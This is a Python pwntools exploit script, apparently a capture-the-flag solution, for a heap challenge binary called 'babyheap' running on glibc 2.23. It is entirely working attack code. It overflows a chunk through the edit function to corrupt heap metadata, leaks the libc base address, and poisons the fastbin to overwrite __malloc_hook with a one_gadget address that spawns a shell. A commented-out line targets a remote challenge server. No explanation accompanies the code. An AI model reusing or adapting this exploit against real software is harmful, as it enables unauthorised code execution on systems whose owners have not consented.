from pwn import *
def cmd(c):
	p.sendlineafter(">> ",str(c))
def add(size,data):
	cmd(1)
	p.sendline(str(size))
	p.send(data.ljust(size,'\x00'))
def edit(idx,data,size):
	cmd(2)
	p.sendline(str(idx))
	p.sendline(str(size))
	p.send(data.ljust(size,'\x00'))
def show(idx):
	cmd(3)
	p.sendline(str(idx))
def free(idx):
	cmd(4)
	p.sendline(str(idx))
#context.log_level='debug'
p=process("./babyheap",env={'LD_PRELOAD':"./libc-2.23.so"})
#p=remote("111.198.29.45",31578)
add(0x18,"A")#0
add(0x18,"A")#1
add(0x18,"A")#2
add(0x100,p64(0x21)*4)#3
add(0x18,"A")#4
free(3)
free(2)
free(1)
edit(0,"\x00"*0x18+p64(0x21)+"\x80",0x21)
add(0x18,"A")#1
add(0x18,"A")#2
add(0x1,"A")#3

show(2)
base=u64(p.read(8))-(0x7ffff7dd1b78-0x00007ffff7a0d000)
log.info(hex(base))
add(0xe8,'n132')#5
add(0x18,"A")#6
add(0x68,"B")#7
add(0x68,"C")#8
libc=ELF("./libc-2.23.so")
libc.address=base
add(0x68,p64(libc.symbols['__malloc_hook']-35))#9
free(8)
free(7)
edit(6,"\x00"*0x18+p64(0x71)+"\x90",0x21)

add(0x68,"A")
add(0x68,"A")
one=0xf0274
add(0x68,"\x00"*19+p64(one+base))
add(0x68,"whoami\n")
#gdb.attach(p)

p.interactive()


